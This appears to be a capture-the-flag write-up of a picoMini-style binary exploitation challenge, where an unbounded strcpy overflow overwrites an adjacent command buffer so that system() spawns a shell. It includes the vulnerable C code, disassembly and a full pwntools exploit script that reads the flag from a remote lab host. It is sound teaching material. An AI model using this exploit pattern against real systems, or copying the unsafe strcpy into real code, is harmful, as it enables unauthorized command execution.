# CyLab — Input Injection 1

* **Platform:** CyLab Security Academy / picoMini by CMU-Africa (Challenge ID: `525`)
* **Category:** Binary Exploitation (Pwn)
* **Difficulty:** Difficulty 2
* **Date Solved:** October 2026
* **Tools Used:** Python 3, pwntools, GDB, objdump
* **Binary:** `vuln` (x86_64 ELF)

---

## TL;DR

A stack buffer overflow allows overwriting an adjacent local stack buffer that is subsequently passed directly as an argument to `system()`. In function `fun()`, `buffer[10]` is populated via unbounded `strcpy()` from attacker-controlled user input and sits immediately below `c[10]` (initialized to `"uname"`). By sending 10 padding bytes followed by `"sh"`, `c` is overwritten with `"sh"`, transforming `system(c)` into an interactive command shell to read the flag.

---

## Recon

### Binary Information

Running `file` and `checksec`:

```text
$ file vuln
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=..., not stripped

$ checksec --file=vuln
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Key observations:
1. **No Stack Canary:** Stack smashing is undetected by compiler instrumentation.
2. **Adjacent Stack Buffers:** The function executes `system(c)` using an argument residing directly on the stack next to the user input buffer.
3. **No ROP Required:** Because `system()` is invoked natively with our overwritten argument, return address hijacking is unnecessary.

---

## Static Analysis & Vulnerability

### 1. Source Code Review

```c
void fun(char *name, char *cmd) {
    char c[10];
    char buffer[10];
    strcpy(c, cmd);        // c is populated with default command "uname"
    strcpy(buffer, name);  // VULNERABILITY: Unbounded copy of attacker-controlled input
    printf("Goodbye, %s!\n", buffer);
    system(c);
}
```

### 2. Disassembly & Stack Frame Layout

Examining the assembly of `fun` in GDB:

```asm
0x0000000000401186 <+20>:   lea    rax, [rbp-0xa]       ; c is located at rbp-0x0a
0x000000000040118a <+24>:   mov    rsi, rdx             ; cmd ("uname")
0x000000000040118d <+27>:   mov    rdi, rax
0x0000000000401190 <+30>:   call   0x401040 <strcpy@plt>
0x0000000000401195 <+35>:   lea    rax, [rbp-0x14]      ; buffer is located at rbp-0x14
0x0000000000401199 <+39>:   mov    rsi, rbx             ; name (user input)
0x000000000040119c <+42>:   mov    rdi, rax
0x000000000040119f <+45>:   call   0x401040 <strcpy@plt>
...
0x00000000004011bf <+77>:   lea    rdi, [rbp-0xa]       ; passes c directly to system()
0x00000000004011c3 <+81>:   call   0x401050 <system@plt>
```

The stack frame layout around `fun`:

```text
       Lower Addresses (Stack Top)
  +----------------------------------+  [rbp - 0x14]
  |         buffer[10]               |  (Target of unbounded strcpy)
  +----------------------------------+  [rbp - 0x0a]
  |            c[10]                 |  (Command buffer: initially "uname\0")
  +----------------------------------+  [rbp]
  |         Saved RBP (8B)           |
  +----------------------------------+  [rbp + 0x08]
  |      Saved Return Address (8B)   |
  +----------------------------------+
       Higher Addresses
```

Offset calculation:
$$\text{Offset} = (rbp - 0x0a) - (rbp - 0x14) = 0x14 - 0x0a = 10 \text{ bytes}$$

Writing 10 bytes fills `buffer[10]`. Any subsequent bytes immediately overwrite the memory of `c[10]`.

---

## Dynamic Analysis & Exploitation Strategy

1. **Target Identification:** Instead of attempting to reach `saved rip` and constructing a ROP chain, we exploit the immediate control flow primitive: `system(c)`.
2. **Payload Design:**
   - 10 bytes of padding (`b"A" * 10`) to saturate `buffer[10]`.
   - String `b"sh"` (automatically null-terminated by `strcpy`).
3. **Execution Flow:**
   - `strcpy(c, cmd)` sets `c` to `"uname"`.
   - `strcpy(buffer, name)` fills `buffer` with 10 `'A'`s and overwrites `c` with `"sh\x00"`.
   - `system(c)` executes `system("sh")`, spawning a subshell bound to standard I/O.
   - We send `cat flag.txt` to capture the flag without corrupting the saved base pointer or return address.

---

## Exploit

The complete exploit script is available at [exploit.py](exploit.py):

```python
#!/usr/bin/env python3
import re, sys, time
from pwn import *

context.log_level = "info"
HOST, PORT = "xebec.cylabacademy.net", 34899

def solve(io):
    io.recvuntil(b"name?")
    # 10 bytes padding + "sh" to overwrite command argument buffer c[10]
    io.sendline(b"A" * 10 + b"sh")
    io.recvuntil(b"!\n")
    # Command shell is active; read the flag
    io.sendline(b"cat flag.txt; cat /flag.txt 2>/dev/null; cat flag* 2>/dev/null")
    time.sleep(1)
    data = io.recv(timeout=4)
    m = re.search(rb"academy\{[^}]+\}", data)
    if m:
        log.success(f"Flag captured: {m.group().decode()}")
    else:
        print(data.decode(errors="replace"))

if __name__ == "__main__":
    io = process("./vuln") if len(sys.argv) > 1 and sys.argv[1] == "local" else remote(HOST, PORT)
    solve(io)
```

---

## Flag

```text
$ python3 exploit.py
[+] Opening connection to xebec.cylabacademy.net on port 34899: Done
[+] Flag captured: academy{redacted}
[*] Closed connection to xebec.cylabacademy.net port 34899
```

---

## Key Takeaways & Lessons

1. **Adjacent Stack Variables as Exploitation Targets:** A buffer overflow does not always need to reach the return address or RBP. Overwriting an adjacent data pointer or string passed into sensitive APIs like `system()`, `popen()`, or `execve()` provides immediate RCE with minimal payload length.
2. **Stack Frame Disassembly Verification:** Compiler alignment and variable placement rules can create unexpected padding. Disassembling the function with GDB or IDA to inspect exact offsets (`[rbp-0x14]` vs `[rbp-0xa]`) eliminates guesswork.
3. **Clean Shell Spawning:** Launching `"sh"` rather than a lengthy complex command string avoids payload length constraints and prevents stack corruption issues on process exit.
